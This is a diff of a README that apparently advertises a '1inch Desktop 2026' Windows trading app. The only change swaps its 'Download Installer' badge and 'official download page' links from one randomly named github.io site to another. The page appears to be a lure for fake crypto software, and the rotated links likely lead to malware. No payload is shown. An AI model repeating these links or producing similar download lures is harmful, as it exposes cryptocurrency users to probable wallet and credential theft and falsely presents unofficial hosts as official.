@@ -2,7 +2,7 @@
 
 Welcome to **1inch Desktop 2026**, the premier Windows application designed to enhance your cryptocurrency trading experience with powerful exchange aggregation features. This tool is optimized for Windows 10/11 and provides a seamless interface for managing multiple exchanges in one place, making it an essential asset for traders in 2026.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Overview
 
@@ -58,7 +58,7 @@ A: No, 1inch Desktop is exclusively designed for Windows desktop environments to
 
 ## Download
 
-For the latest version and updates, please visit the official download page: [Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+For the latest version and updates, please visit the official download page: [Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ## Changelog
 
